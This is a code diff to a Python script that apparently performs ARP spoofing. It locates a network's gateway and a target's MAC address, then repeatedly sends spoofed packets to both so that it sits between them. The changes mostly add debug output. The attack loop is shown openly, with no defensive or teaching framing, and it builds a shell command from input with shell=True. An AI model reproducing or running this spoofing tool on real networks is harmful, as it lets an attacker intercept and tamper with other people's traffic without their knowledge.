@@ -11,6 +11,8 @@ import network_scanner_optparse as scanner
 
 def find_gateway(net):
     get_gateway_command = f"arp -a | sed -n '/gateway.*{net}/ p' | sed  's/.*(\(.*\)).*/\\1/ g'"
+    # get_gateway_command = f"arp -a | sed -n '/gateway/ p' | sed  's/.*(\(.*\)).*/\\1/ g'"
+    
 
     gateway = str(subprocess.check_output(get_gateway_command, shell=True)
                   ).replace(r"b'", '').replace("\\n'", '')
@@ -61,11 +63,12 @@ def get_target_ip(options):
 def get_mac(gateway, target):
     while True:
         try:
-            mac_address = [el for el in scanner.scan(
-                gateway + r'/24') if el['ip'] == target][0]['mac']
+            result = scanner.scan(gateway + r'/24')
+            mac_address = [el for el in result if el['ip'] == target][0]['mac']
             break
         except IndexError as err:
             print(err)
+            print(f'{gateway} {result}')
             time.sleep(3.0)
 
     return mac_address
@@ -100,12 +103,17 @@ if __name__ == '__main__':
         gateway = find_gateway(net)
         sent_packets = 0
         target_mac = get_mac(gateway, target)
+
+        print(f'Net: {net}')
+        print(f'Gateway: {gateway}')
+        print(f'Target mac: {target_mac}')
+
         try:
             while True:
                 spoof(target, gateway, target_mac)
                 spoof(gateway, target, target_mac)
                 sent_packets += 2
-                print(f"\r[+] Packets sent: {sent_packets}", end='')
+                print(f"\r[+] Packets sent: {sent_packets} target {target} gateway {gateway} target_mac {target_mac}", end='')
                 time.sleep(2)
         except KeyboardInterrupt:
             print('[+] Detected CTRL + C...Quitting.')
@@ -116,5 +124,6 @@ if __name__ == '__main__':
         print('ERROR.Nor target\'s ip machine is provided!!')
         net = get_interface(options)
         gateway = find_gateway(net)
+        print(f"Net: {net}\nGateway: {gateway}")
         print('\nAvailable machines:\n')
         print(scanner.print_results(scanner.scan(gateway + r'/24')))
